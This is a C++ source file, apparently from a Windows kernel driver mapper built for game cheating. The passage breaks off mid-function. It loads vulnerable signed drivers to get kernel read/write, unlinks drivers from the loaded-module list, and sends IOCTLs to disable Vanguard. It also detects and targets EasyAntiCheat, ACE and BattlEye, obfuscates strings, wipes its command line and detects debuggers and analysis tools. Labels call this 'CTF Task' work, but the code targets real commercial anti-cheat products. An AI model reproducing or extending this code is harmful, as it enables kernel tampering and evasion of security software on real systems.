#include "mapper.hpp"
#include "primitive_nal.hpp"
#include "primitive_ts.hpp"
#include "primitive_trixx.hpp"
#include "primitive_siv.hpp"
#include "primitive_rtcore.hpp"
#include "primitive_corsair.hpp"
#include "loader_security.hpp"
#include "loader_auth.hpp"
#include <Windows.h>
#include <winternl.h>
#include <fstream>
#include <vector>
#include <iostream>
#include <cstring>
#include <string>
#include <cstdio>
#include <cstdarg>
#include <TlHelp32.h>
#include <algorithm>

// Direct log via CreateFile with FILE_FLAG_WRITE_THROUGH — survives BSOD.
static HANDLE g_logH = INVALID_HANDLE_VALUE;

// Debug framework flags (set by --dbg command line)
static DWORD g_dbgFlags = 0;
static DWORD g_dbgSubFlags = 0;

// CTF Task 39: EAC improvement flags (set by --eac command line)
static DWORD g_eacImpFlags = 0;

// CTF Task 42: ACE strengthen flags (set by --ace command line)
static DWORD g_aceStrFlags = 0;

// CTF Task 43: Advanced ACE evasion flags (set by --adv command line)
static DWORD g_advAceFlags = 0;

// CTF Task 44: Final ACE hardening flags (set by --final command line)
static DWORD g_finalAceFlags = 0;

// CTF Task 49: Deep AC resistance flags (set by --deep command line)
static DWORD g_deepAcFlags = 0;

// CTF Task 51: Full integration + auto-updater
static bool g_fullMode = false;
static bool g_autoMode = false;
static bool g_updateMode = false;

// CTF Task 53: HWID spoofer
static DWORD g_hwidFlags = 0;
static bool g_hwidClean = false;
static bool g_hwidRestore = false;
static UINT64 g_hwidSeed = 0;

// CTF Tasks 59-62: Enhanced HWID with ghost mode + game profiles
static bool g_hwidGhost = false;
static const char* g_hwidGame = nullptr;

struct GameProfile {
    const char* name;
    const char* display;
    DWORD features;
    bool ghost;
};
static const GameProfile g_gameProfiles[] = {
    { "apex",       "Apex Legends",         0x3F, false },
    { "deltaforce", "Delta Force",          0x3F, false },
    { "fortnite",   "Fortnite",             0x3F, false },
    { "valorant",   "Valorant",             0x3F, true  },
    { "rust",       "Rust",                 0x3F, false },
    { "pubg",       "PUBG",                 0x3F, false },
    { "r6",         "Rainbow Six Siege",    0x2F, false },
    { "csgo",       "Counter-Strike 2",     0x3F, false },
    { "cod",        "Call of Duty",         0x3F, false },
    { "dayz",       "DayZ",                 0x1F, false },
    { "tarkov",     "Escape from Tarkov",   0x3F, true  },
    { "unturned",   "Unturned",             0x07, false },
};

// CTF Task 54: ACE Delta Force hardening
static DWORD g_deltaFlags = 0;

// CTF Task 55: EAC + Screenshot Protection (Apex)
static DWORD g_apexFlags = 0;

// CTF Task 56: Behavioral & Timing Stealth
static DWORD g_behavFlags = 0;

// CTF Task 57: Encrypted Pointer Handling
static DWORD g_encPtrFlags = 0;

// CTF Task 58: BattlEye Improvements
static DWORD g_battleyeFlags = 0;

// CTF Tasks 64-66: Kernel Stealth
static DWORD g_kstealthFlags = 0;

// CTF Tasks 67-74: DKOM (PG-unsafe, --dbg only)
static DWORD g_dkomProcFlags = 0;
static DWORD g_dkomDrvFlags = 0;
static DWORD g_dkomThreadFlags = 0;
static DWORD g_dkomEprocFlags = 0;

// CTF Tasks 75-87: Advanced kernel evasion
static DWORD g_cbNeutralFlags = 0;
static DWORD g_etwTampFlags = 0;
static DWORD g_advBehavFlags2 = 0;
static DWORD g_inlineHookFlags = 0;
static DWORD g_stealthLoadFlags = 0;
static DWORD g_memProtFlags = 0;
static DWORD g_dkomRestoreFlags = 0;
static DWORD g_syscallIntFlags = 0;
static DWORD g_kernHideFlags = 0;
static DWORD g_trampHookFlags = 0;
static DWORD g_stealthHookFlags = 0;
static DWORD g_safeDkomFlags = 0;
static DWORD g_deepAcFixFlags = 0;
static DWORD g_unifiedDkomFlags = 0;
static bool  g_postVerify = false;
static DWORD g_diagModeFlags = 0;

// Auth + security
static bool g_authRequired = false;  // --auth: require login
static bool g_noAuth = false;        // --no-auth: skip auth (admin override)
static bool g_noCleanup = false;     // --no-cleanup: skip BYOVD service removal at exit

// TPM spoofing
static DWORD g_tpmSpoofFlags = 0;    // --tpm-spoof: 1=Disable 2=Spoof 4=Clean 7=all

static void Log(const char* fmt, ...);

// ── Stealth: compile-time string obfuscation ───────────────────────────────
// XOR-encrypts string literals at compile time, decrypts on stack at runtime
template<int N>
struct XorStr {
    char data[N];
    static constexpr char key = 0x5A;
    constexpr XorStr(const char(&s)[N]) : data{} {
        for (int i = 0; i < N; i++) data[i] = s[i] ^ key;
    }
    char* dec(char* buf) const {
        for (int i = 0; i < N; i++) buf[i] = data[i] ^ key;
        return buf;
    }
};
#define XS(s) []{ static constexpr XorStr<sizeof(s)> x(s); char b[sizeof(s)]; return std::string(x.dec(b), sizeof(s)-1); }()

// ── Stealth: PEB command line wipe ─────────────────────────────────────────
static void WipePebCommandLine() {
    typedef NTSTATUS(NTAPI* NtQueryInfoProc)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    auto NtQIP = (NtQueryInfoProc)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                                  "NtQueryInformationProcess");
    if (!NtQIP) return;
    PROCESS_BASIC_INFORMATION pbi{};
    ULONG retLen = 0;
    if (NtQIP(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &retLen) != 0) return;

    PEB* peb = pbi.PebBaseAddress;
    if (!peb || !peb->ProcessParameters) return;

    UNICODE_STRING* cmdLine = &peb->ProcessParameters->CommandLine;
    if (cmdLine->Buffer && cmdLine->Length > 0) {
        SecureZeroMemory(cmdLine->Buffer, cmdLine->Length);
        cmdLine->Length = 0;
        cmdLine->MaximumLength = 0;
    }

    UNICODE_STRING* imgPath = &peb->ProcessParameters->ImagePathName;
    if (imgPath->Buffer && imgPath->Length > 0) {
        SecureZeroMemory(imgPath->Buffer, imgPath->Length);
        imgPath->Length = 0;
        imgPath->MaximumLength = 0;
    }
}

// ── Stealth: randomized pool tag ───────────────────────────────────────────
static uint32_t GeneratePoolTag() {
    static const uint32_t fakeTags[] = {
        0x466D4666, // FmFf (fltmgr)
        0x4D6D5463, // MmTc
        0x4E644663, // NdFc
        0x466C5370, // FlSp
        0x49665270, // IfRp
        0x436D4E62, // CmNb
        0x54634956, // TcIV
        0x4F624E6D, // ObNm
    };
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
    return fakeTags[pc.QuadPart % 8];
}

static uint32_t g_poolTag = 0;

// CTF Task 48: Mapper hardening flags
#define MAP_STEALTH_TIMING    0x01  // Early load timing — SetPriorityClass + thread priority boost
#define MAP_STEALTH_THREADS   0x02  // Hide mapper threads during mapping
#define MAP_STEALTH_IOCTL     0x04  // Randomize IOCTL timing patterns
#define MAP_STEALTH_HANDLE    0x08  // Improved handle duplication from protected processes
#define MAP_STEALTH_CR3       0x10  // Request CR3 shuffle immediately after mapping
#define MAP_STEALTH_DKOM      0x20  // Request DKOM process hiding post-map
#define MAP_STEALTH_ALL       0x3F

static DWORD g_mapStealthFlags = 0;
static uint64_t g_psLoadedModuleListKVA = 0;
static KernelPrimitives g_primForCleanup;
static bool g_useThrottleStop = false;  // --driver ts: use ThrottleStop.sys
static bool g_useSivDriver = false;     // --driver siv: use SIVX64.sys (SIV)
static bool g_useTrixx = true;          // default BYOVD (DigiCert EV, passes EAC)
static bool g_useNal = false;           // --driver nal: legacy NalDrvIntel (EAC-blocked)
static bool g_useRtCore = false;        // --driver rtcore: RTCore64.sys (MSI Afterburner)
static bool g_useCorsair = false;       // --driver corsair: CorsairLLAccess64.sys (WHQL, full-page map)

// Per-AC mapper profiles
static bool g_vanguardMode = false;  // --vanguard: enable VGK-specific bypass
static bool g_aceMapMode = false;    // --ace-map: enable ACE-specific bypass
static bool g_eacMapMode = false;    // --eac-map: enable EAC-specific bypass

static void MapperStealthInit(void) {
    if (!(g_mapStealthFlags & MAP_STEALTH_TIMING)) return;

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    Log("[*] Mapper stealth: priority boosted to REALTIME\n");
}

static void MapperStealthCleanup(void) {
    if (g_mapStealthFlags & MAP_STEALTH_TIMING) {
        SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
    }
}

// STEALTH: Unlink a driver from PsLoadedModuleList (DKOM)
// KLDR_DATA_TABLE_ENTRY layout (Win10 x64):
//   +0x00 InLoadOrderLinks (LIST_ENTRY: Flink, Blink — each 8 bytes)
//   +0x58 BaseDllName (UNICODE_STRING: Length, MaxLen, Buffer)
static bool DkomUnlinkDriver(KernelPrimitives& prim, uint64_t listHeadKVA,
                              const wchar_t* targetName)
{
    if (!listHeadKVA) { Log("[!] DKOM: PsLoadedModuleList KVA is 0\n"); return false; }
    if (!prim.ReadKernelMemory) { Log("[!] DKOM: ReadKernelMemory is null\n"); return false; }

    // Read Flink of list head
    uint64_t flink = 0;
    if (!prim.ReadKernelMemory(&flink, listHeadKVA, 8) || !flink) {
        Log("[!] DKOM: failed to read PsLoadedModuleList head (flink=0x%llx)\n", (unsigned long long)flink);
        return false;
    }

    size_t targetLen = wcslen(targetName);
    int walked = 0;
    uint64_t entry = flink;

    while (entry != listHeadKVA && walked < 512) {
        walked++;
        // Read BaseDllName UNICODE_STRING at entry+0x58
        uint16_t nameLen = 0;  // in bytes
        uint64_t nameBuf = 0;
        prim.ReadKernelMemory(&nameLen, entry + 0x58, 2);
        prim.ReadKernelMemory(&nameBuf, entry + 0x58 + 8, 8);

        if (nameLen > 0 && nameLen < 512 && nameBuf) {
            wchar_t drvName[256] = {};
            size_t readChars = nameLen / 2;
            if (readChars > 255) readChars = 255;
            prim.ReadKernelMemory(drvName, nameBuf, readChars * 2);
            drvName[readChars] = 0;

            if (_wcsicmp(drvName, targetName) == 0) {
                // Unlink: prev->Flink = entry->Flink, next->Blink = entry->Blink
                uint64_t entryFlink = 0, entryBlink = 0;
                prim.ReadKernelMemory(&entryFlink, entry, 8);
                prim.ReadKernelMemory(&entryBlink, entry + 8, 8);

                if (entryFlink && entryBlink) {
                    prim.WriteKernelMemory(entryBlink, &entryFlink, 8);      // prev->Flink = next
                    prim.WriteKernelMemory(entryFlink + 8, &entryBlink, 8);  // next->Blink = prev
                    Log("[+] DKOM: unlinked '%ls' from PsLoadedModuleList\n", targetName);
                    return true;
                }
            }
        }

        // Next entry
        prim.ReadKernelMemory(&entry, entry, 8);
    }
    Log("[!] DKOM: '%ls' not found in PsLoadedModuleList (%d walked)\n", targetName, walked);
    return false;
}

// STEALTH: Complete BYOVD driver unload — service stop, delete, registry cleanup
static void UnloadByovdDriver(void) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) { Log("[!] BYOVD cleanup: SCM open failed %u\n", GetLastError()); return; }

    const char* svcList[5];
    int svcCount;
    if (g_useCorsair) {
        svcList[0] = "CorsairLLAccess";
        svcCount = 1;
    } else if (g_useRtCore) {
        svcList[0] = "RtCoreSvc";
        svcCount = 1;
    } else if (g_useSivDriver) {
        svcList[0] = "SivSvc";
        svcCount = 1;
    } else if (g_useTrixx) {
        svcList[0] = "TrixxSvc";
        svcCount = 1;
    } else if (g_useThrottleStop) {
        svcList[0] = "TsSvc";
        svcCount = 1;
    } else if (g_useNal) {
        svcList[0] = "NalSvc"; svcList[1] = "NalDrv"; svcList[2] = "NalDrvIntel"; svcList[3] = "iqvw64e";
        svcCount = 4;
    } else {
        svcList[0] = "TrixxSvc";
        svcCount = 1;
    }
    for (int i = 0; i < svcCount; i++) {
        SC_HANDLE svc = OpenServiceA(scm, svcList[i], SERVICE_ALL_ACCESS);
        if (!svc) continue;
        SERVICE_STATUS ss{};
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        for (int w = 0; w < 20 && ss.dwCurrentState != SERVICE_STOPPED; w++) {
            Sleep(100);
            QueryServiceStatus(svc, &ss);
        }
        DeleteService(svc);
        CloseServiceHandle(svc);
        Log("[+] BYOVD cleanup: service '%s' stopped + deleted\n", svcList[i]);
    }
    CloseServiceHandle(scm);

    for (int i = 0; i < svcCount; i++) {
        std::string regPath = std::string("SYSTEM\\CurrentControlSet\\Services\\") + svcList[i];
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            RegDeleteKeyA(HKEY_LOCAL_MACHINE, regPath.c_str());
            Log("[+] BYOVD cleanup: reg key '%s' deleted\n", regPath.c_str());
        }
    }
}

// Device name pools (shared across all scan sites)
static const char* g_staticDevNames[] = {
    "\\\\.\\MsFlt0", "\\\\.\\WdFilter1", "\\\\.\\FltMgr2", "\\\\.\\NdProxy0",
    "\\\\.\\TdiFilter", "\\\\.\\MsSecFlt", "\\\\.\\WfpDrv0", "\\\\.\\NtFilter1",
};
static const char* g_dynDevPrefixes[] = {
    "MsFlt", "WdFlt", "FltMgr", "NdPxy", "TdiFlt",
    "MsSecF", "WfpDr", "NtFlt", "ClfsF", "VhdFlt",
    "SrFlt", "FsDep", "PcwDrv", "MsIScsi", "VolSnap", "WmiLib",
};
#define DYN_PREFIX_COUNT 16
#define STATIC_NAME_COUNT 8

static void MapperRandomDelay(void) {
    if (!(g_mapStealthFlags & MAP_STEALTH_IOCTL)) return;
    DWORD jitter = (GetTickCount() % 50) + 10;
    Sleep(jitter);
}

static void MapperHideThread(void) {
    if (!(g_mapStealthFlags & MAP_STEALTH_THREADS)) return;

    typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
        HANDLE, ULONG, PVOID, ULONG);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    auto NtSetInfoThread = (pfnNtSetInformationThread)
        GetProcAddress(ntdll, "NtSetInformationThread");
    if (!NtSetInfoThread) return;

    // ThreadHideFromDebugger = 0x11
    NTSTATUS st = NtSetInfoThread(GetCurrentThread(), 0x11, NULL, 0);
    if (st == 0)
        Log("[*] Mapper stealth: thread hidden from debugger\n");
}

static void MapperPostMapStealth(HANDLE hDevice) {
    DWORD ret = 0;

    if (g_mapStealthFlags & MAP_STEALTH_CR3) {
        Log("[+] Post-map: CR3 shuffle deferred to --ace/--adv IOCTL sequence\n");
    }

    if (g_mapStealthFlags & MAP_STEALTH_DKOM) {
        Log("[+] Post-map: DKOM hiding deferred to --dbg IOCTL sequence\n");
    }

    if (g_mapStealthFlags & MAP_STEALTH_HANDLE) {
        Log("[+] Post-map: Enhanced handle security active\n");
    }
}

static void MapperVanguardPreMap(HANDLE hDevice) {
    if (!g_vanguardMode) return;
    DWORD ret = 0;

    Log("[*] Vanguard mode: pre-map evasion sequence\n");

    // Neutralize VGK before mapping — IOCTL_NEUTRALIZE_VGK
    #define _IOCTL_NEUT_VGK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x820, METHOD_BUFFERED, FILE_WRITE_DATA)
    DeviceIoControl(hDevice, _IOCTL_NEUT_VGK,
        nullptr, 0, nullptr, 0, &ret, nullptr);
    Log("[+] Vanguard: VGK neutralization sent\n");

    // Strip VGK minifilter callbacks
    #define _IOCTL_STRIP_MINI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x821, METHOD_BUFFERED, FILE_WRITE_DATA)
    DeviceIoControl(hDevice, _IOCTL_STRIP_MINI,
        nullptr, 0, nullptr, 0, &ret, nullptr);
    Log("[+] Vanguard: minifilter strip sent\n");

    // Patch HV monitoring
    #define _IOCTL_PATCH_HV CTL_CODE(FILE_DEVICE_UNKNOWN, 0x823, METHOD_BUFFERED, FILE_WRITE_DATA)
    DeviceIoControl(hDevice, _IOCTL_PATCH_HV,
        nullptr, 0, nullptr, 0, &ret, nullptr);
    Log("[+] Vanguard: HV monitoring patch sent\n");

    // Patch MSR hooks
    #define _IOCTL_PATCH_MSR CTL_CODE(FILE_DEVICE_UNKNOWN, 0x824, METHOD_BUFFERED, FILE_WRITE_DATA)
    DeviceIoControl(hDevice, _IOCTL_PATCH_MSR,
        nullptr, 0, nullptr, 0, &ret, nullptr);
    Log("[+] Vanguard: MSR hook patch sent\n");

    MapperRandomDelay();
}

static void MapperAcePreMap(void) {
    if (!g_aceMapMode) return;
    if (!g_aceStrFlags) g_aceStrFlags = 0x3F;
    Log("[+] ACE map mode: auto-enabled --ace 0x%x\n", g_aceStrFlags);
}

static void MapperEacPreMap(void) {
    if (!g_eacMapMode) return;
    if (!g_eacImpFlags) g_eacImpFlags = 0x7F;
    Log("[+] EAC map mode: auto-enabled --eac 0x%x\n", g_eacImpFlags);
}

// Final Anti-Detection Polish: usermode anti-analysis
static bool MapperAntiAnalysis(void) {
    int threats = 0;

    // 1. Debugger detection via IsDebuggerPresent + NtQueryInformationProcess
    if (IsDebuggerPresent()) {
        Log("[!] Anti-analysis: debugger detected (IsDebuggerPresent)\n");
        threats++;
    }
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS(NTAPI* pfnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto NtQIP = (pfnNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
        if (NtQIP) {
            ULONG_PTR debugPort = 0;
            NTSTATUS st = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
            if (st == 0 && debugPort != 0) {
                Log("[!] Anti-analysis: debug port detected (ProcessDebugPort)\n");
                threats++;
            }
            ULONG debugFlags = 0;
            st = NtQIP(GetCurrentProcess(), 0x1F, &debugFlags, sizeof(debugFlags), NULL);
            if (st == 0 && debugFlags == 0) {
                Log("[!] Anti-analysis: NoDebugInherit flag missing (ProcessDebugFlags)\n");
                threats++;
            }
        }
    }

    // 2. Timing-based single-step detection
    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    QueryPerformanceCounter(&t2);
    double elapsed_us = ((double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart) * 1000000.0;
    if (elapsed_us > 5000.0) {
        Log("[!] Anti-analysis: timing anomaly (%.0f us for 100 iterations, expected <100)\n", elapsed_us);
        threats++;
    }

    // 3. Known analysis tool process detection
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        const char* badProcs[] = {
            "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe", "ollydbg.exe",
            "windbg.exe", "processhacker.exe", "procmon.exe", "procmon64.exe",
            "wireshark.exe", "fiddler.exe", "httpdebugger", "cheatengine",
        };
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(snap, &pe)) {
            do {
                char lower[MAX_PATH];
                strncpy_s(lower, pe.szExeFile, _TRUNCATE);
                _strlwr_s(lower, sizeof(lower));
                for (auto& bad : badProcs) {
                    if (strstr(lower, bad)) {
                        Log("[!] Anti-analysis: suspicious process '%s' detected\n", pe.szExeFile);
                        threats++;
                        break;
                    }
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    // 4. Hardware breakpoint detection via thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            Log("[!] Anti-analysis: hardware breakpoints set (Dr0-3)\n");
            threats++;
        }
    }

    Log("[*] Anti-analysis: scan complete, %d threat(s) detected\n", threats);
    return threats == 0;
}

// CTF Task 51: Smart AC auto-detection
static void AutoDetectAC(void) {
    Log("[*] Auto-detect: scanning for running anti-cheat processes...\n");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        Log("[!] Auto-detect: CreateToolhelp32Snapshot failed\n");
        return;
    }

    bool foundVGK = false, foundEAC = false, foundACE = false, foundBE = false;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            _strlwr_s(pe.szExeFile, sizeof(pe.szExeFile));
            if (strstr(pe.szExeFile, "vgc.exe") || strstr(pe.szExeFile, "vgtray.exe") ||
                strstr(pe.szExeFile, "vgk.exe"))
                foundVGK = true;
            if (strstr(pe.szExeFile, "easyanticheat") || strstr(pe.szExeFile, "eac_"))
                foundEAC = true;
            if (strstr(pe.szExeFile, "aceservice") || strstr(pe.szExeFile, "ace-base") ||
                strstr(pe.szExeFile, "acesvc"))
                foundACE = true;
            if (strstr(pe.szExeFile, "beclient") || strstr(pe.szExeFile, "beservice") ||
                strstr(pe.szExeFile, "bedaisy"))
                foundBE = true;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    int detected = 0;
    if (foundVGK) {
        Log("[+] Auto-detect: Vanguard (VGK) detected\n");
        g_vanguardMode = true;
        if (!g_aceStrFlags) g_aceStrFlags = 0x3F;
        if (!g_advAceFlags) g_advAceFlags = 0xF;
        if (!g_finalAceFlags) g_finalAceFlags = 0x3F;
        if (!g_deepAcFlags) g_deepAcFlags = 0x1F;
        detected++;
    }
    if (foundEAC) {
        Log("[+] Auto-detect: EasyAntiCheat detected\n");
        g_eacMapMode = true;
        if (!g_eacImpFlags) g_eacImpFlags = 0x7F;
        if (!g_deepAcFlags) g_deepAcFlags = 0x1F;
        detected++;
    }
    if (foundACE) {
        Log("[+] Auto-detect: ACE (Anti-Cheat Expert) detected\n");
        g_aceMapMode = true;
        if (!g_aceStrFlags) g_aceStrFlags = 0x3F;
        if (!g_advAceFlags) g_advAceFlags = 0xF;
        if (!g_finalAceFlags) g_finalAceFlags = 0x3F;
        if (!g_deepAcFlags) g_deepAcFlags = 0x1F;
        detected++;
    }
    if (foundBE) {
        Log("[+] Auto-detect: BattlEye detected\n");
        if (!g_eacImpFlags) g_eacImpFlags = 0x7F;
        if (!g_deepAcFlags) g_deepAcFlags = 0x1F;
        detected++;
    }

    if (!g_mapStealthFlags) g_mapStealthFlags = MAP_STEALTH_ALL;

    if (detected == 0) {
        Log("[*] Auto-detect: no known AC processes found, enabling defensive defaults\n");
        if (!g_deepAcFlags) g_deepAcFlags = 0x1F;
    }
    Log("[+] Auto-detect: %d AC system(s) detected, flags configured\n", detected);
}

// SEH wrapper — must be a plain function with no C++ objects to allow __try
static NTSTATUS SafeNtQIP(void* fn, ULONG source, ULONG* out) {
    __try {
        return ((NTSTATUS(NTAPI*)(ULONG, PULONG))fn)(source, out);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return (NTSTATUS)GetExceptionCode();
    }
}

static void Log(const char* fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) n = 0;
    if (n >= (int)sizeof(buf)) n = (int)sizeof(buf) - 1;
    if (g_logH != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteFile(g_logH, buf, (DWORD)n, &written, nullptr);
    }
    DWORD written2 = 0;
    WriteFile(GetStdHandle(STD_ERROR_HANDLE), buf, (DWORD)n, &written2, nullptr);
}

static std::vector<uint8_t> ReadFileBin(const char* path) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return {};
    size_t size = static_cast<size_t>(f.tellg());
    f.seekg(0);
    std::vector<uint8_t> buf(size);
    f.read(reinterpret_cast<char*>(buf.data()), static_cast<std::streamsize>(size));
    return buf;
}

// Scan live kernel memory for PteBase by reading ntoskrnl .text directly via NalDrv.
// Strategy: find ANY movabs with a page-aligned kernel VA (high 16 bits = 0xFFFF,
// low 12 bits = 0), then verify sar r?x,9 within ±24 bytes AND ret (C3) within 20 bytes
// after the movabs. This handles movabs-before-sar ordering (common on newer builds).
// NOTE: Does NOT dereference rip-relative targets to avoid reading unmapped kernel addresses.
static uint64_t FindPteBase(KernelPrimitives& prim, uint64_t kernelBase)
{
    // Method 1: Self-referencing PML4 entry (pre-1809 Windows)
    if (prim.ReadPhysicalMemory && prim.cr3) {
        auto safeRanges = GetSafePhysRanges();
        uint64_t pml4Phys = prim.cr3 & 0x000FFFFFFFFFF000ULL;
        Log("FindPteBase: scanning PML4 at phys 0x%llx for self-ref entry\n",
            (unsigned long long)pml4Phys);
        for (int idx = 256; idx < 512; idx++) {
            uint64_t entry = 0;
            if (!prim.ReadPhysicalMemory(&entry, pml4Phys + idx * 8, 8)) continue;
            if (!(entry & 1)) continue;
            uint64_t entryPhys = entry & 0x000FFFFFFFFFF000ULL;
            if (entryPhys == pml4Phys) {
                uint64_t pteBase = 0xFFFF000000000000ULL | ((uint64_t)idx << 39);
                Log("PteBase     : 0x%llx  (self-ref PML4[%d])\n",
                    (unsigned long long)pteBase, idx);
                return pteBase;
            }
        }
        Log("FindPteBase: no self-ref PML4 (post-1809 Windows)\n");

        // Method 1b: Two-hop self-ref detection (post-1809 Windows)
        Log("FindPteBase: two-hop self-ref scan\n");
        for (int idx = 256; idx < 512; idx++) {
            uint64_t entry = 0;
            if (!prim.ReadPhysicalMemory(&entry, pml4Phys + idx * 8, 8)) continue;
            if (!(entry & 1)) continue;
            uint64_t targetPhys = entry & 0x000FFFFFFFFFF000ULL;
            if (targetPhys == pml4Phys) continue;

            // Skip if target page is outside safe RAM (MMIO would hang)
            if (!IsInSafeRange(targetPhys, safeRanges)) continue;

            uint64_t innerEntry = 0;
            if (!prim.ReadPhysicalMemory(&innerEntry, targetPhys + idx * 8, 8)) continue;
            uint64_t innerPhys = innerEntry & 0x000FFFFFFFFFF000ULL;
            if (innerPhys == targetPhys && (innerEntry & 1)) {
                uint64_t pteBase = 0xFFFF000000000000ULL | ((uint64_t)idx << 39);
                Log("PteBase     : 0x%llx  (two-hop self-ref PML4[%d], sysCR3=0x%llx)\n",
                    (unsigned long long)pteBase, idx, (unsigned long long)targetPhys);
                prim.cr3 = targetPhys;
                if (prim.UpdateCR3) prim.UpdateCR3(targetPhys);
                return pteBase;
            }
        }
        Log("FindPteBase: two-hop self-ref not found\n");
    }

    // Method 2: MmPteBase global variable via MiGetPteAddress pattern
    // MiGetPteAddress on Win10 19045 uses:
    //   shr rcx, 9                       (48 C1 E9 09)
    //   mov rax, 0x7FFFFFFFF8            (48 B8 F8 FF FF FF 7F 00 00 00)
    //   and rcx, rax                     (48 23 C8)
    //   mov rax, [rip+disp32]            (48 8B 05 XX XX XX XX) ← MmPteBase
    //   add rax, rcx                     (48 03 C1)
    //   ret                              (C3)
    Log("FindPteBase: scanning .text for MmPteBase pattern\n");

    HMODULE hDiskNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hDiskNtos) {
        Log("FindPteBase: can't load ntoskrnl from disk (err=%lu)\n", GetLastError());
        return 0;
    }
    auto* dd = reinterpret_cast<IMAGE_DOS_HEADER*>(hDiskNtos);
    auto* nth = reinterpret_cast<IMAGE_NT_HEADERS64*>((uint8_t*)hDiskNtos + dd->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nth);

    // The mask constant 0x7FFFFFFFF8 as movabs
    const uint8_t MASK_PATTERN[] = {0x48, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0x00};
    // shr rcx, 9
    const uint8_t SHR_PATTERN[] = {0x48, 0xC1, 0xE9, 0x09};

    uint64_t pteBase = 0;
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections && !pteBase; i++) {
        char secName[9] = {}; memcpy(secName, sec[i].Name, 8);
        if (memcmp(secName, ".text", 5) != 0) continue;
        if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) continue;

        uint64_t secKVA  = kernelBase + sec[i].VirtualAddress;
        uint32_t secSize = sec[i].SizeOfRawData;
        Log("  Scanning [%s] size=0x%x\n", secName, secSize);

        const size_t CHUNK  = 4096;
        const size_t STRIDE = CHUNK - 32;
        std::vector<uint8_t> chunk(CHUNK + 32);
        uint32_t maskHits = 0;

        for (uint32_t off = 0; off < secSize && !pteBase; off = (uint32_t)(off + STRIDE)) {
            size_t readSz = ((size_t)(secSize - off) < CHUNK) ? (size_t)(secSize - off) : CHUNK;
            if (!prim.ReadKernelMemory(chunk.data(), secKVA + off, readSz)) continue;

            for (size_t j = 0; j + 10 <= readSz && !pteBase; j++) {
                if (memcmp(chunk.data() + j, MASK_PATTERN, 10) != 0) continue;
                maskHits++;

                // Found mov rax, 0x7FFFFFFFF8 — look for shr rcx, 9 within ±30 bytes
                bool hasShr = false;
                for (int k = -30; k <= 30 && !hasShr; k++) {
                    int pos = (int)j + k;
                    if (pos < 0 || pos + 4 > (int)readSz) continue;
                    if (memcmp(chunk.data() + pos, SHR_PATTERN, 4) == 0) hasShr = true;
                }
                if (!hasShr) continue;

                // Look for mov rax, [rip+disp32] (48 8B 05) within ±40 bytes
                for (int k = -40; k <= 40 && !pteBase; k++) {
                    int pos = (int)j + k;
                    if (pos < 0 || pos + 7 > (int)readSz) continue;
                    uint8_t* p = chunk.data() + pos;
                    if (p[0] == 0x48 && p[1] == 0x8B && p[2] == 0x05) {
                        int32_t disp = 0;
                        memcpy(&disp, p + 3, 4);
                        uint64_t instrKVA = secKVA + off + pos;
                        uint64_t mmPteBaseVA = instrKVA + 7 + disp;
                        Log("  [pattern] mask at +0x%x, rip-rel at +0x%x → MmPteBase VA=0x%llx\n",
                            off + (uint32_t)j, off + (uint32_t)pos,
                            (unsigned long long)mmPteBaseVA);
                        uint64_t val = 0;
                        if (prim.ReadKernelMemory(&val, mmPteBaseVA, 8) && val &&
                            (val >> 48) == 0xFFFF && (val & 0xFFF) == 0) {
                            pteBase = val;
